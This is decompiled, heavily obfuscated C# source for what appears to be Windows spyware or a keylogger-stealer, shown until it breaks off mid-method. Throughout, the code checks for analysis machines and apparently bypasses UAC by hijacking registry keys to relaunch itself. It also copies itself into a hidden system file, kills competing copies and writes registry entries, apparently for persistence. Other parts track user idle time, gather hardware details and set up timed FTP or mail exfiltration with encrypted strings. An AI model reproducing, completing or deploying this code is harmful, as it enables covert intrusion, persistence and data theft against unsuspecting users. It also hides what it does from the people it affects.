using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

// Token: 0x02000010 RID: 16
[StandardModule]
internal sealed class afg
{
	// Token: 0x06000049 RID: 73 RVA: 0x000195B0 File Offset: 0x000177B0
	// Note: this type is marked as 'beforefieldinit'.
	static afg()
	{
		for (;;)
		{
			IL_4C4:
			uint num = 3996978100u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 2542003945u)) % 25u)
				{
				case 0u:
				{
					string[] array;
					array[8] = <Module>.smethod_0(552000);
					num = (num2 * 828446690u ^ 4112572656u);
					continue;
				}
				case 1u:
					afg.cew = "";
					afg.ceq = false;
					num = (num2 * 3876396292u ^ 3760721802u);
					continue;
				case 2u:
					goto IL_4C4;
				case 3u:
					afg.cdq = "60";
					afg.cdz = "60";
					afg.cef = true;
					afg.ceg = "ftp";
					num = (num2 * 1275186991u ^ 1302843684u);
					continue;
				case 4u:
				{
					string[] array;
					array[9] = <Module>.smethod_0(552048);
					afg.cfz = array;
					afg.cgh = null;
					afg.cgj = null;
					num = (num2 * 1155434669u ^ 1197981855u);
					continue;
				}
				case 5u:
				{
					string[] array;
					array[5] = <Module>.smethod_0(552240);
					array[6] = <Module>.smethod_0(552288);
					array[7] = <Module>.smethod_0(552208);
					num = (num2 * 3760759170u ^ 1351797517u);
					continue;
				}
				case 6u:
					afg.cgk = null;
					num = (num2 * 2051474659u ^ 3916536933u);
					continue;
				case 7u:
					afg.cer = false;
					afg.ces = false;
					afg.cet = Environment.GetEnvironmentVariable(<Module>.smethod_0(553328)) + <Module>.smethod_0(553120);
					num = (num2 * 365417162u ^ 3377062677u);
					continue;
				case 8u:
					afg.cfm = Registry.LocalMachine.OpenSubKey(<Module>.smethod_0(552880), false);
					num = (num2 * 4063048218u ^ 316567465u);
					continue;
				case 9u:
					afg.ceh = false;
					num = (num2 * 885113757u ^ 268579211u);
					continue;
				case 10u:
					afg.cfr = "";
					afg.cgl = new afg.ux();
					num = (num2 * 1897320443u ^ 3173499855u);
					continue;
				case 11u:
					afg.cey = false;
					afg.cex = false;
					num = (num2 * 137074335u ^ 2879408806u);
					continue;
				case 12u:
					afg.cez = false;
					afg.cfg = cjp.cjr();
					afg.cfh = <Module>.smethod_0(553040);
					afg.cfj = SystemInformation.UserName + "/" + SystemInformation.ComputerName;
					afg.cfk = <Module>.smethod_0(553088);
					afg.FrameworkVersion = Environment.Version.Major;
					afg.cfl = new Random(checked((int)(DateTime.Now.Ticks % 2147483647L)));
					num = (num2 * 428891134u ^ 725809355u);
					continue;
				case 13u:
					afg.ceu = false;
					afg.cev = false;
					num = (num2 * 2808478590u ^ 3157916066u);
					continue;
				case 14u:
					afg.cen = false;
					num = (num2 * 1812951454u ^ 1173960244u);
					continue;
				case 15u:
				{
					string[] array;
					array[4] = <Module>.smethod_0(551424);
					num = (num2 * 519843390u ^ 2926707134u);
					continue;
				}
				case 16u:
					afg.cdu = true;
					num = (num2 * 566945524u ^ 912081238u);
					continue;
				case 17u:
					afg.ceo = false;
					afg.cep = false;
					num = (num2 * 1451465898u ^ 822425294u);
					continue;
				case 18u:
					afg.cfn = RuntimeHelpers.GetObjectValue(afg.cfm.GetValue(<Module>.smethod_0(552928)));
					num = (num2 * 2439351885u ^ 3034633133u);
					continue;
				case 19u:
					afg.cej = false;
					afg.cek = false;
					afg.cel = false;
					afg.cem = false;
					num = (num2 * 962493167u ^ 1264619007u);
					continue;
				case 20u:
					afg.cdv = "";
					afg.cdy = true;
					afg.cdx = true;
					afg.cdw = false;
					num = (num2 * 423417556u ^ 1257791271u);
					continue;
				case 21u:
					afg.cgm = new afg.acm();
					afg.cgn = new afg.adm();
					num = (num2 * 2574274784u ^ 2381767375u);
					continue;
				case 22u:
				{
					afg.cfw = 1;
					afg.cfq = true;
					string[] array = new string[10];
					array[0] = <Module>.smethod_0(551616);
					array[1] = <Module>.smethod_0(551664);
					array[2] = <Module>.smethod_0(551456);
					array[3] = <Module>.smethod_0(551376);
					num = (num2 * 490319089u ^ 2450790967u);
					continue;
				}
				case 23u:
					afg.cfo = <Module>.smethod_0(551824);
					num = (num2 * 1793572037u ^ 1242338461u);
					continue;
				}
				return;
			}
		}
	}

	// Token: 0x0600004A RID: 74
	[DllImport("user32.dll")]
	public static extern bool GetLastInputInfo(ref afg.ho afj);

	// Token: 0x0600004B RID: 75 RVA: 0x00019A8C File Offset: 0x00017C8C
	private static void afk()
	{
		afg.afv(<Module>.smethod_0(551840), <Module>.smethod_0(550736), "");
		Thread.Sleep(100);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(<Module>.smethod_0(550784), true);
			registryKey.SetValue(<Module>.smethod_0(550576), "");
			for (;;)
			{
				IL_8D:
				uint num = 258778915u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1717415205u)) % 3u)
					{
					case 0u:
						goto IL_8D;
					case 2u:
						registryKey.Close();
						num = (num2 * 3856461520u ^ 1042740637u);
						continue;
					}
					goto Block_3;
				}
			}
			Block_3:;
		}
		catch (Exception ex)
		{
			return;
		}
		afg.afv(<Module>.smethod_0(550624), <Module>.smethod_0(550544), Assembly.GetExecutingAssembly().Location);
		Process.Start(<Module>.smethod_0(550336));
		Thread.Sleep(1000);
		afg.agj(<Module>.smethod_0(550384), <Module>.smethod_0(551200));
	}

	// Token: 0x0600004C RID: 76 RVA: 0x00019BA4 File Offset: 0x00017DA4
	private static void afm()
	{
		afg.afv(<Module>.smethod_0(551120), <Module>.smethod_0(551168), Assembly.GetExecutingAssembly().Location);
		for (;;)
		{
			IL_78:
			uint num = 3715967295u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3532337200u)) % 3u)
				{
				case 1u:
					Process.Start(new ProcessStartInfo(<Module>.smethod_0(550960))
					{
						WindowStyle = ProcessWindowStyle.Normal
					});
					num = (num2 * 1013361192u ^ 2314079900u);
					continue;
				case 2u:
					goto IL_78;
				}
				goto Block_1;
			}
		}
		Block_1:
		Thread.Sleep(1000);
		afg.agj(<Module>.smethod_0(551008), <Module>.smethod_0(550928));
	}

	// Token: 0x0600004D RID: 77 RVA: 0x00019C54 File Offset: 0x00017E54
	private static object afo()
	{
		object current = WindowsIdentity.GetCurrent();
		object instance = new WindowsPrincipal((WindowsIdentity)current);
		return Conversions.ToBoolean(NewLateBinding.LateGet(instance, null, <Module>.smethod_0(549696), new object[]
		{
			WindowsBuiltInRole.Administrator
		}, null, null, null));
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00019CAC File Offset: 0x00017EAC
	private static object afv(string afy, string afx, string afw)
	{
		object result;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(afy, true);
			for (;;)
			{
				IL_7F:
				uint num = 4100414973u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2717961868u)) % 4u)
					{
					case 0u:
						registryKey.Close();
						registryKey = Registry.CurrentUser.OpenSubKey(afy + "\\" + afx, true);
						num = (num2 * 206472545u ^ 3079589494u);
						continue;
					case 1u:
						registryKey.CreateSubKey(afx);
						num = (num2 * 3680570652u ^ 2347046852u);
						continue;
					case 3u:
						goto IL_7F;
					}
					goto Block_2;
				}
			}
			Block_2:
			registryKey.SetValue("", afw);
			result = true;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600004F RID: 79 RVA: 0x00019D7C File Offset: 0x00017F7C
	private static object agj(string agk, string agl)
	{
		object result;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(agk, true);
			registryKey.DeleteSubKey(agl);
			result = true;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000050 RID: 80 RVA: 0x00019DCC File Offset: 0x00017FCC
	public static bool agp(int agr, int ags)
	{
		checked
		{
			for (;;)
			{
				if (agr < ags)
				{
					goto IL_04;
				}
				goto IL_2C;
				IL_09:
				int num;
				switch ((num ^ 1345341883) % 4)
				{
				case 1:
					return false;
				case 2:
					IL_04:
					num = 1151549954;
					goto IL_09;
				case 3:
					IL_2C:
					agr--;
					num = 626867463;
					goto IL_09;
				}
				Thread.Sleep(1000);
			}
			return false;
		}
	}

	// Token: 0x06000051 RID: 81 RVA: 0x00019E20 File Offset: 0x00018020
	[STAThread]
	public static void agu()
	{
		if (afg.agp(15, 1))
		{
			goto IL_16;
		}
		goto IL_91;
		uint num2;
		for (;;)
		{
			IL_49:
			uint num;
			switch ((num = (num2 ^ 632743371u)) % 6u)
			{
			case 0u:
				Application.Exit();
				num2 = (num * 1226761279u ^ 1754860795u);
				continue;
			case 1u:
				Application.Exit();
				num2 = (num * 853523102u ^ 295535101u);
				continue;
			case 2u:
				goto IL_91;
			case 4u:
				goto IL_79;
			case 5u:
				goto IL_16;
			}
			break;
		}
		string osfullName = hj.hk.Info.OSFullName;
		if (osfullName.Contains(<Module>.smethod_0(549744)) | osfullName.Contains(<Module>.smethod_0(549536)) | osfullName.Contains(<Module>.smethod_0(549456)))
		{
			try
			{
				string path = Path.GetTempPath() + <Module>.smethod_0(549504);
				if (Operators.ConditionalCompareObjectEqual(afg.afo(), false, false))
				{
					goto IL_17C;
				}
				goto IL_269;
				uint num3;
				for (;;)
				{
					IL_21D:
					uint num;
					switch ((num = (num3 ^ 632743371u)) % 13u)
					{
					case 0u:
					{
						string value = File.ReadAllText(path);
						num3 = 695706165u;
						continue;
					}
					case 1u:
						if (osfullName.Contains(<Module>.smethod_0(549296)))
						{
							num3 = (num * 2072159169u ^ 1314702130u);
							continue;
						}
						goto IL_16D;
					case 2u:
					{
						string value;
						if (Conversions.ToInteger(value) <= 3)
						{
							num3 = (num * 560441509u ^ 3494503876u);
							continue;
						}
						break;
					}
					case 3u:
					{
						int num4 = Conversions.ToInteger(File.ReadAllText(path));
						num3 = (num * 1165504994u ^ 2960797807u);
						continue;
					}
					case 4u:
						goto IL_157;
					case 5u:
					{
						int num4;
						File.WriteAllText(path, Conversions.ToString(checked(num4 + 1)));
						num3 = (num * 2275839241u ^ 473735290u);
						continue;
					}
					case 7u:
						goto IL_269;
					case 8u:
						goto IL_17C;
					case 9u:
						goto IL_16D;
					case 11u:
						if (File.Exists(path))
						{
							num3 = (num * 3673398256u ^ 1374384431u);
							continue;
						}
						goto IL_157;
					case 12u:
						afg.afk();
						num3 = (num * 4274851395u ^ 3450395807u);
						continue;
					}
					break;
					IL_157:
					File.WriteAllText(path, "1");
					num3 = 1227410166u;
					continue;
					IL_16D:
					afg.afm();
					num3 = 957096735u;
				}
				goto IL_289;
				IL_17C:
				num3 = 2006358577u;
				goto IL_21D;
				IL_269:
				File.Delete(path);
				num3 = 1904141366u;
				goto IL_21D;
			}
			catch (Exception ex)
			{
			}
			goto IL_289;
		}
		goto IL_289;
		IL_16:
		num2 = 1521437006u;
		goto IL_49;
		IL_79:
		afg.amu();
		if (afg.ceq)
		{
			num2 = 431976844u;
			goto IL_49;
		}
		goto IL_289;
		IL_91:
		if (Operators.ConditionalCompareObjectEqual(afg.ajn(), true, false))
		{
			num2 = 98452029u;
			goto IL_49;
		}
		goto IL_79;
		IL_289:
		if (Operators.CompareString(afg.ceg, <Module>.smethod_0(549344), false) == 0)
		{
			goto IL_2A4;
		}
		goto IL_37A;
		uint num5;
		for (;;)
		{
			IL_346:
			uint num;
			switch ((num = (num5 ^ 632743371u)) % 7u)
			{
			case 0u:
				if (afg.ceu)
				{
					num5 = (num * 2668378160u ^ 2450099510u);
					continue;
				}
				goto IL_768;
			case 1u:
				goto IL_37A;
			case 2u:
				if (!Directory.Exists(Environment.GetEnvironmentVariable(<Module>.smethod_0(550288)) + <Module>.smethod_0(550080)))
				{
					num5 = (num * 610022471u ^ 4183607510u);
					continue;
				}
				goto IL_3B4;
			case 3u:
				if (Operators.CompareString(afg.cew, afg.cet, false) != 0)
				{
					num5 = (num * 252789594u ^ 3751681441u);
					continue;
				}
				goto IL_768;
			case 5u:
				afg.bcr();
				afg.aqz();
				num5 = (num * 249224425u ^ 2528941876u);
				continue;
			case 6u:
				goto IL_2A4;
			}
			break;
		}
		Directory.CreateDirectory(Environment.GetEnvironmentVariable(<Module>.smethod_0(550128)) + <Module>.smethod_0(549920));
		try
		{
			IL_3B4:
			if (File.Exists(afg.cet))
			{
				try
				{
					string fullPath = Path.GetFullPath(afg.cet);
					for (;;)
					{
						IL_485:
						uint num6 = 329124473u;
						for (;;)
						{
							uint num;
							Process[] processes;
							int num7;
							Process process;
							switch ((num = (num6 ^ 632743371u)) % 7u)
							{
							case 0u:
								goto IL_485;
							case 1u:
								processes = Process.GetProcesses();
								num7 = 0;
								num6 = (num * 824464722u ^ 2643533422u);
								continue;
							case 2u:
								goto IL_411;
							case 4u:
								goto IL_3E3;
							case 5u:
								process.Kill();
								num6 = (num * 1197006338u ^ 1409260381u);
								continue;
							case 6u:
								if (num7 >= processes.Length)
								{
									num6 = 456109568u;
									continue;
								}
								goto IL_3E3;
							}
							goto Block_40;
							IL_3E3:
							process = processes[num7];
							string fullPath2 = Path.GetFullPath(process.MainModule.FileName);
							if (Operators.CompareString(fullPath2, fullPath, false) == 0)
							{
								num6 = 1665578874u;
								continue;
							}
							IL_411:
							checked
							{
								num7++;
								num6 = 707526506u;
							}
						}
					}
					Block_40:;
				}
				catch (Exception ex2)
				{
					for (;;)
					{
						IL_4D0:
						uint num8 = 415512147u;
						for (;;)
						{
							uint num;
							switch ((num = (num8 ^ 632743371u)) % 3u)
							{
							case 1u:
								num8 = (num * 240137217u ^ 2871395935u);
								continue;
							case 2u:
								goto IL_4D0;
							}
							goto Block_42;
						}
					}
					Block_42:;
				}
			}
			if (File.Exists(afg.cew))
			{
				if (File.Exists(afg.cet))
				{
					try
					{
						File.Delete(afg.cet);
					}
					catch (Exception ex3)
					{
					}
				}
				File.Copy(afg.cew, afg.cet, true);
				if (afg.cev)
				{
					for (;;)
					{
						IL_566:
						uint num9 = 512674963u;
						for (;;)
						{
							uint num;
							switch ((num = (num9 ^ 632743371u)) % 3u)
							{
							case 0u:
								goto IL_566;
							case 1u:
								File.SetAttributes(afg.cet, FileAttributes.Hidden | FileAttributes.System);
								num9 = (num * 3266846163u ^ 2245015517u);
								continue;
							}
							goto Block_36;
						}
					}
					Block_36:;
				}
			}
		}
		catch (Exception ex4)
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(<Module>.smethod_0(549840), true);
			registryKey.SetValue(<Module>.smethod_0(549888), afg.cet);
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(<Module>.smethod_0(597808), true);
			for (;;)
			{
				IL_753:
				uint num10 = 1639724813u;
				for (;;)
				{
					uint num;
					switch ((num = (num10 ^ 632743371u)) % 13u)
					{
					case 0u:
					{
						byte[] value2;
						registryKey2.SetValue(<Module>.smethod_0(597856), value2);
						num10 = (num * 2722702715u ^ 3953319798u);
						continue;
					}
					case 1u:
						registryKey2.Close();
						num10 = (num * 3759907583u ^ 3760028555u);
						continue;
					case 2u:
						if (registryKey2 != null)
						{
							num10 = (num * 3264296287u ^ 2345733044u);
							continue;
						}
						break;
					case 3u:
					{
						byte[] array;
						array[10] = 0;
						array[11] = 0;
						num10 = (num * 1934658198u ^ 1025201617u);
						continue;
					}
					case 4u:
					{
						byte[] array;
						array[8] = 0;
						num10 = (num * 3912787945u ^ 3921211191u);
						continue;
					}
					case 5u:
					{
						byte[] array;
						array[9] = 0;
						num10 = (num * 205837700u ^ 237294124u);
						continue;
					}
					case 6u:
					{
						byte[] array;
						array[1] = 0;
						num10 = (num * 1091434212u ^ 2069625574u);
						continue;
					}
					case 7u:
					{
						byte[] array = new byte[12];
						array[0] = 2;
						num10 = (num * 1850575925u ^ 2518594058u);
						continue;
					}
					case 8u:
					{
						byte[] array;
						array[2] = 0;
						array[3] = 0;
						num10 = (num * 1734057370u ^ 226346122u);
						continue;
					}
					case 9u:
					{
						byte[] array;
						byte[] value2 = array;
						num10 = (num * 1651469507u ^ 1291846225u);
						continue;
					}
					case 10u:
						goto IL_753;
					case 12u:
					{
						byte[] array;
						array[4] = 0;
						array[5] = 0;
						array[6] = 0;
						array[7] = 0;
						num10 = (num * 3043947573u ^ 2351419926u);
						continue;
					}
					}
					goto Block_47;
				}
			}
			Block_47:;
		}
		catch (Exception ex5)
		{
		}
		IL_768:
		afg.bhz(afg.cet);
		if (afg.cex)
		{
			goto IL_831;
		}
		goto IL_B57;
		uint num11;
		Thread thread2;
		System.Timers.Timer timer4;
		for (;;)
		{
			IL_AC2:
			uint num;
			switch ((num = (num11 ^ 632743371u)) % 24u)
			{
			case 0u:
			{
				System.Timers.Timer timer = new System.Timers.Timer();
				num11 = (num * 3866150595u ^ 2765523294u);
				continue;
			}
			case 1u:
			{
				System.Timers.Timer timer2;
				timer2.Elapsed += afg.atv;
				timer2.Interval = (double)(checked(60000 * Conversions.ToInteger(afg.cdq)));
				timer2.Enabled = true;
				timer2.Start();
				num11 = (num * 244561806u ^ 3685810319u);
				continue;
			}
			case 2u:
				goto IL_978;
			case 3u:
				goto IL_781;
			case 4u:
				goto IL_B57;
			case 5u:
				Interaction.Shell(<Module>.smethod_0(597776), AppWinStyle.MinimizedFocus, false, -1);
				num11 = (num * 1431700278u ^ 962934290u);
				continue;
			case 6u:
			{
				Thread thread = new Thread(new ThreadStart(afg.bky));
				num11 = (num * 3602218935u ^ 1326363713u);
				continue;
			}
			case 7u:
				goto IL_B41;
			case 8u:
				goto IL_9B7;
			case 9u:
				afg.bcf();
				num11 = (num * 3323362010u ^ 1408541055u);
				continue;
			case 10u:
			{
				System.Timers.Timer timer2 = new System.Timers.Timer();
				num11 = (num * 2728797207u ^ 1025575404u);
				continue;
			}
			case 11u:
				thread2.IsBackground = true;
				thread2.Start();
				if (afg.cdy)
				{
					num11 = (num * 3980264007u ^ 3415134460u);
					continue;
				}
				goto IL_978;
			case 13u:
			{
				System.Timers.Timer timer;
				timer.Elapsed += afg.aor;
				timer.Interval = (double)(checked(60000 * Conversions.ToInteger(afg.cdz)));
				timer.Enabled = true;
				num11 = (num * 3355134557u ^ 887330858u);
				continue;
			}
			case 14u:
				goto IL_879;
			case 15u:
				if (Operators.CompareString(afg.cew, afg.cet, false) != 0)
				{
					num11 = (num * 1602954905u ^ 2806684469u);
					continue;
				}
				goto IL_B57;
			case 16u:
			{
				Thread thread;
				thread.IsBackground = true;
				thread.Start();
				num11 = (num * 3397560526u ^ 994753048u);
				continue;
			}
			case 17u:
				afg.bjx();
				num11 = (num * 2971853876u ^ 729125115u);
				continue;
			case 18u:
				goto IL_857;
			case 19u:
			{
				System.Timers.Timer timer3 = new System.Timers.Timer();
				num11 = (num * 385087114u ^ 4121749938u);
				continue;
			}
			case 20u:
				goto IL_831;
			case 21u:
				timer4 = new System.Timers.Timer();
				num11 = (num * 3521608363u ^ 3088065146u);
				continue;
			case 22u:
				timer4.Elapsed += afg.axw;
				timer4.Interval = 300000.0;
				num11 = (num * 1978353366u ^ 1656502707u);
				continue;
			case 23u:
			{
				System.Timers.Timer timer3;
				timer3.Elapsed += afg.bcl;
				timer3.Interval = 60000.0;
				timer3.Enabled = true;
				num11 = (num * 3422848294u ^ 3188027091u);
				continue;
			}
			}
			break;
			IL_857:
			if (Operators.CompareString(afg.ceg, <Module>.smethod_0(597408), false) == 0)
			{
				num11 = 629132058u;
				continue;
			}
			goto IL_879;
			IL_9B7:
			if (Operators.CompareString(afg.ceg, <Module>.smethod_0(597616), false) == 0)
			{
				num11 = 1085424872u;
				continue;
			}
			goto IL_857;
			IL_978:
			new Thread(new ThreadStart(afg.asz))
			{
				IsBackground = true
			}.Start();
			if (afg.cdx == Conversions.ToBoolean(<Module>.smethod_0(597568)))
			{
				num11 = 943894307u;
				continue;
			}
			goto IL_9B7;
			IL_879:
			if (Operators.CompareString(afg.ceg, <Module>.smethod_0(598352), false) != 0)
			{
				goto IL_B68;
			}
			num11 = 2129127814u;
		}
		timer4.Enabled = true;
		try
		{
			IL_B68:
			afg.bds();
		}
		catch (Exception ex6)
		{
		}
		new afg.np();
		for (;;)
		{
			IL_C35:
			uint num12 = 1172810465u;
			for (;;)
			{
				uint num;
				switch ((num = (num12 ^ 632743371u)) % 5u)
				{
				case 1u:
					goto IL_BD9;
				case 2u:
					afg.cfu.aer();
					num12 = (num * 2662799569u ^ 2798049947u);
					continue;
				case 3u:
				{
					Thread.Sleep(1000);
					System.Timers.Timer timer5 = new System.Timers.Timer();
					timer5.Elapsed += afg.ayx;
					timer5.Interval = 60000.0;
					timer5.Enabled = true;
					if (afg.cdy)
					{
						num12 = (num * 1648373655u ^ 3825515621u);
						continue;
					}
					goto IL_BD9;
				}
				case 4u:
					goto IL_C35;
				}
				return;
				IL_BD9:
				afg.cft.acw();
				Application.Run();
				num12 = 1688732678u;
			}
		}
		return;
		IL_781:
		thread2 = new Thread(new ThreadStart(afg.bjl));
		num11 = 579224496u;
		goto IL_AC2;
		IL_831:
		num11 = 1525118996u;
		goto IL_AC2;
		IL_B41:
		if (afg.ceh)
		{
			num11 = 767793117u;
			goto IL_AC2;
		}
		goto IL_781;
		IL_B57:
		if (afg.cey)
		{
			num11 = 64855262u;
			goto IL_AC2;
		}
		goto IL_B41;
		IL_2A4:
		num5 = 602240680u;
		goto IL_346;
		IL_37A:
		afg.cew = Assembly.GetExecutingAssembly().Location;
		num5 = 465500629u;
		goto IL_346;
	}

	// Token: 0x06000052 RID: 82 RVA: 0x0001AB00 File Offset: 0x00018D00
	public static object ajn()
	{
		object result;
		try
		{
			string text = SystemInformation.UserName + "\\" + SystemInformation.ComputerName;
			bool flag;
			for (;;)
			{
				IL_1C9:
				uint num = 160544241u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1516848238u)) % 14u)
					{
					case 0u:
					{
						string[] array;
						array[4] = <Module>.smethod_0(597952);
						array[5] = <Module>.smethod_0(598000);
						num = (num2 * 2490180263u ^ 1832025081u);
						continue;
					}
					case 1u:
					{
						string[] array = new string[6];
						array[0] = <Module>.smethod_0(598400);
						num = (num2 * 2631063318u ^ 144871095u);
						continue;
					}
					case 2u:
					{
						string[] array3;
						string[] array2 = array3;
						int num3 = 0;
						num = (num2 * 219093728u ^ 511032418u);
						continue;
					}
					case 3u:
					{
						string[] array2;
						int num3;
						if (num3 >= array2.Length)
						{
							num = 861150918u;
							continue;
						}
						goto IL_5B;
					}
					case 4u:
						num = (num2 * 2947604307u ^ 1589538643u);
						continue;
					case 5u:
					{
						string[] array;
						array[3] = <Module>.smethod_0(598160);
						num = (num2 * 705738815u ^ 575560283u);
						continue;
					}
					case 7u:
					{
						string[] array;
						array[1] = <Module>.smethod_0(598192);
						num = (num2 * 200180444u ^ 2901554707u);
						continue;
					}
					case 8u:
						goto IL_1C9;
					case 9u:
					{
						string[] array;
						array[2] = <Module>.smethod_0(598240);
						num = (num2 * 1158992287u ^ 1057538554u);
						continue;
					}
					case 10u:
						goto IL_5B;
					case 11u:
					{
						string[] array;
						string[] array3 = array;
						flag = false;
						num = (num2 * 773097238u ^ 2914459038u);
						continue;
					}
					case 12u:
						flag = true;
						num = (num2 * 947308681u ^ 1412418031u);
						continue;
					case 13u:
						goto IL_1A;
					}
					goto Block_4;
					IL_1A:
					checked
					{
						int num3;
						num3++;
						num = 1734872951u;
						continue;
						IL_5B:
						string[] array2;
						string text2 = array2[num3];
						if (!text.ToLower().Contains(text2.ToLower()))
						{
							goto IL_1A;
						}
						num = 1458298504u;
					}
				}
			}
			Block_4:
			result = flag;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000053 RID: 83 RVA: 0x0001AD18 File Offset: 0x00018F18
	public static object ajw(int ajq)
	{
		string text = Conversions.ToString(Strings.Chr(afg.cfl.Next(65, 91)));
		int num = 1;
		int num2 = checked(ajq - 1);
		int num3 = num;
		for (;;)
		{
			IL_13F:
			if (num3 <= num2)
			{
				goto IL_117;
			}
			uint num4 = 2418332073u;
			char value;
			for (;;)
			{
				IL_CC:
				uint num5;
				switch ((num5 = (num4 ^ 3379585127u)) % 11u)
				{
				case 0u:
					goto IL_25;
				case 1u:
					goto IL_13F;
				case 3u:
					num4 = 4257855080u;
					continue;
				case 4u:
					text += Conversions.ToString(value);
					num4 = 3576008100u;
					continue;
				case 5u:
					goto IL_98;
				case 6u:
					goto IL_7D;
				case 7u:
					checked
					{
						num3++;
					}
					num4 = (num5 * 1276865614u ^ 2124104708u);
					continue;
				case 8u:
					goto IL_117;
				case 9u:
					num4 = (num5 * 3730019867u ^ 989589265u);
					continue;
				case 10u:
					num4 = (num5 * 2169827172u ^ 417896420u);
					continue;
				}
				return text;
			}
			IL_25:
			value = Strings.Chr(afg.cfl.Next(48, 58));
			num4 = 2224219156u;
			goto IL_CC;
			IL_7D:
			value = Strings.Chr(afg.cfl.Next(97, 123));
			num4 = 2224219156u;
			goto IL_CC;
			IL_98:
			value = Strings.Chr(afg.cfl.Next(65, 91));
			num4 = 4171002683u;
			goto IL_CC;
			IL_117:
			switch (afg.cfl.Next(1, 4))
			{
			case 1:
				goto IL_98;
			case 2:
				goto IL_7D;
			case 3:
				goto IL_25;
			default:
				num4 = 3364754744u;
				goto IL_CC;
			}
		}
		return text;
	}

	// Token: 0x06000054 RID: 84
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string aks, [MarshalAs(UnmanagedType.VBByRefStr)] ref string akt, int aku, ref int akv, ref int aky, ref int akx, [MarshalAs(UnmanagedType.VBByRefStr)] ref string akw, int akq);

	// Token: 0x06000055 RID: 85
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDiskFreeSpaceExA([MarshalAs(UnmanagedType.VBByRefStr)] ref string alm, ref long aln, ref long alo, ref long alp);

	// Token: 0x06000056 RID: 86 RVA: 0x0001AE6C File Offset: 0x0001906C
	public static string alr(afg.hp als)
	{
		string result;
		try
		{
			ComputerInfo computerInfo = new ComputerInfo();
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(<Module>.smethod_0(596768), <Module>.smethod_0(596688));
			ManagementObjectSearcher managementObjectSearcher2;
			for (;;)
			{
				IL_6F:
				uint num = 4333005u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1235427540u)) % 4u)
					{
					case 1u:
						managementObjectSearcher2 = new ManagementObjectSearcher(<Module>.smethod_0(596736));
						if (als == afg.hp.OperatingSystemName)
						{
							num = (num2 * 2594961781u ^ 2359996787u);
							continue;
						}
						break;
					case 2u:
						goto IL_419;
					case 3u:
						goto IL_6F;
					}
					goto Block_3;
				}
			}
			Block_3:
			if (als != afg.hp.ProcessorName)
			{
				goto IL_1AD;
			}
			string text;
			try
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher2.Get().GetEnumerator();
				for (;;)
				{
					IL_11E:
					uint num3 = 1668193652u;
					for (;;)
					{
						uint num2;
						ManagementObject managementObject;
						switch ((num2 = (num3 ^ 1235427540u)) % 6u)
						{
						case 0u:
							goto IL_11E;
						case 1u:
							text = managementObject.GetPropertyValue(<Module>.smethod_0(596528)).ToString();
							num3 = (num2 * 1819274256u ^ 2802602611u);
							continue;
						case 2u:
							num3 = (num2 * 4244130975u ^ 2636184547u);
							continue;
						case 4u:
							goto IL_A0;
						case 5u:
							if (!enumerator.MoveNext())
							{
								num3 = 1004515885u;
								continue;
							}
							goto IL_A0;
						}
						goto Block_11;
						IL_A0:
						managementObject = (ManagementObject)enumerator.Current;
						num3 = 788831595u;
					}
				}
				Block_11:;
			}
			finally
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator;
				if (enumerator != null)
				{
					for (;;)
					{
						IL_168:
						uint num4 = 1755990253u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num4 ^ 1235427540u)) % 3u)
							{
							case 0u:
								goto IL_168;
							case 2u:
								((IDisposable)enumerator).Dispose();
								num4 = (num2 * 2783512357u ^ 3479962759u);
								continue;
							}
							goto Block_14;
						}
					}
					Block_14:;
				}
			}
			string text2 = text;
			IL_17C:
			int num5 = 1555429234;
			IL_181:
			switch ((num5 ^ 1235427540) % 5)
			{
			case 0:
				IL_1AD:
				if (als == afg.hp.AmountOfMemory)
				{
					num5 = 1204629312;
					goto IL_181;
				}
				break;
			case 2:
				text2 = Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(computerInfo.TotalPhysicalMemory)) / 1024.0 / 1024.0, 2)) + " MB";
				goto IL_421;
			case 3:
				goto IL_17C;
			case 4:
				goto IL_421;
			}
			if (als == afg.hp.VideocardName)
			{
				string text3;
				try
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator2 = managementObjectSearcher.Get().GetEnumerator();
					for (;;)
					{
						IL_2A1:
						uint num6 = 472290593u;
						for (;;)
						{
							uint num2;
							ManagementObject managementObject2;
							switch ((num2 = (num6 ^ 1235427540u)) % 6u)
							{
							case 0u:
								goto IL_2A1;
							case 1u:
								text3 = managementObject2.GetPropertyValue(<Module>.smethod_0(596576)).ToString();
								num6 = (num2 * 2762399349u ^ 807885401u);
								continue;
							case 2u:
								if (!enumerator2.MoveNext())
								{
